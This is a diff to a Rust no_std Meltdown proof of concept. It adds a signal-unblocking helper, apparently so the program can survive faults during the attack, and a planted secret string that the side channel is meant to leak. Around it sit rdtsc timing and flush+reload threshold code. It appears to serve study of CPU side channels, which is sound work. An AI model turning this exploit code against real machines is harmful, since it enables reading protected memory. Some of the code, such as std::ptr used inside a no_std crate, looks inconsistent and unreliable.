@@ -1,12 +1,23 @@
 #![no_std]
+#![feature(libc)]
 
 extern crate alloc;
+extern crate libc;
 
 #[allow(unused_imports)]
 use runtime::*;
 use terminal::{print, println};
 
 use core::arch::asm;
+use libc::*;
+
+unsafe extern "C" fn unblock_signal(signum: c_int) {
+    // Rust version inspired from https://gist.github.com/ksqsf/b90877ae12c293c933800e3ead11a2e3
+    let mut sigs = core::mem::uninitialized::<sigset_t>();
+    sigemptyset(&mut sigs);
+    sigaddset(&mut sigs, signum);
+    sigprocmask(SIG_UNBLOCK, &sigs, std::ptr::null_mut());
+}
 
 pub fn rdtsc() -> u64 {
     let high: u32;
@@ -93,6 +104,7 @@ pub fn detect_flush_reload_threshold() -> u64{
 pub fn main() {
     println!("Meltdown start\n");
     const ARRAY_SIZE: usize = 256 * 256; // 256 entries, each containing 256 u128's, meaning 256*4K
+    const SECRET: &str = "Whoever reads this is dumb.";
     
     println!("Current CPU time: {}", rdtsc());
     let cache_miss_threshold = detect_flush_reload_threshold();
